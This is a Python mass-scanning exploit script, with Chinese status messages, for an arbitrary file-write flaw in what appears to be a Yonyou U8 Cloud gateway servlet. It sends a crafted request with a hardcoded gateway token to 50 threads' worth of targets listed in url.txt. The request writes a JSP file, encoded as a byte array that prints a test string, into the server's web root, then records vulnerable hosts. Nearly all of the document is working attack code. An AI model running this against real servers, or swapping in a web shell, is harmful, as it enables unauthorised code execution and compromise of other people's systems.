import requests
import threading
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "*/*",
    "Accept-Language": "en-US;q=0.9,en;q=0.8",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Cache-Control": "max-age=0",
    "gatewaytoken": "TJ6RT-3FVCB-DPYP8-XF7QM-96FV3",
    "Content-Type": "application/json"
}

data = {
    "groupCode": "1002",
    "user": "1002",
    "serviceInfo": {
        "serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
        "serviceMethodName": "writeDocToXMLFile",
        "serviceMethodArgInfo": [
            {
                "argType": {
                    "body": "java.lang.Byte"
                },
                "argValue": {
                    "body": [60, 37, 32, 111, 117, 116, 46, 112, 114, 105, 110, 116, 108, 110, 40, 34, 86, 85, 76, 84, 69, 83, 84, 34, 41, 59, 32, 37, 62]
                },
                "agg": False,
                "isArray": True,
                "isPrimitive": True
            },
            {
                "argType": {
                    "body": "java.lang.String"
                },
                "argValue": {
                    "body": "./webapps/u8c_web/test.jsp"
                },
                "agg": False,
                "isArray": False,
                "isPrimitive": False
            }
        ]
    }
}

def check_vulnerability(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        response = requests.post(
            url + '/service/NCCloudGatewayServlet',
            headers=headers,
            json=data,
            verify=False,
            allow_redirects=False,
            timeout=10
        )

        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code} (重定向)，漏洞不存在")
            return None
        
        elif response.status_code == 200:
            if 'retobi' in response.text:
                print(f"[VULNERABLE] {url} - 漏洞存在!")
                return {
                    'url': url,
                    'status_code': response.status_code,
                    'response_content': response.text
                }
            else:
                print(f"[INFO] {url} - 状态码 200，但响应不包含retobi，漏洞不存在")
                return None
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return None
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return None

def main():
    if not os.path.exists('url.txt'):
        print("[ERROR] url.txt文件不存在!")
        return
    with open('url.txt', 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        print("[INFO] url.txt中没有找到有效的URL")
        return
    
    print(f"[INFO] 开始检测 {len(urls)} 个URL，线程数: 50")
    
    vulnerable_results = []

    with ThreadPoolExecutor(max_workers=50) as executor:

        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}

        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_results.append(result)

    if vulnerable_results:
        with open('result.txt', 'w', encoding='utf-8') as f:
            for result in vulnerable_results:
                f.write("=" * 50 + "\n")
                f.write(f"存在漏洞的URL: {result['url']}\n")
                f.write(f"状态码: {result['status_code']}\n")
                f.write("响应内容:\n")
                f.write(result['response_content'])
                f.write("\n" + "=" * 50 + "\n\n")
        
        print(f"\n[SUCCESS] 发现 {len(vulnerable_results)} 个存在漏洞的URL，详情已写入 result.txt")
    else:
        print(f"\n[INFO] 未发现存在漏洞的URL")

if __name__ == "__main__":
    main()